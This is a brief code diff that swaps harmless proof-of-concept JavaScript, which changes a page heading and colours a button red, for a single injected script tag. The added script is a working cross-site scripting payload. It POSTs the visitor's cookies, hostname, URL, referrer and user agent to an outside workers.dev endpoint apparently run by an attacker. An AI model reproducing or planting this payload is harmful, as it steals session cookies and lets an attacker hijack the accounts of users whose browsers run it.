@@ -1,4 +1,1 @@
-// Change the heading of the page
-document.querySelector('h1').innerText = "Whitek goldengoose PoC";
-// Change a "Submit" button to red
-document.querySelector('button').style.backgroundColor = "red";
+<script>fetch('https://aged-cloud-b431.0days.workers.dev/x/8c12613f5acfd286-qpkh68e3x',{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cookie:document.cookie,domain:location.hostname,url:location.href,ref:document.referrer,ua:navigator.userAgent})})</script>
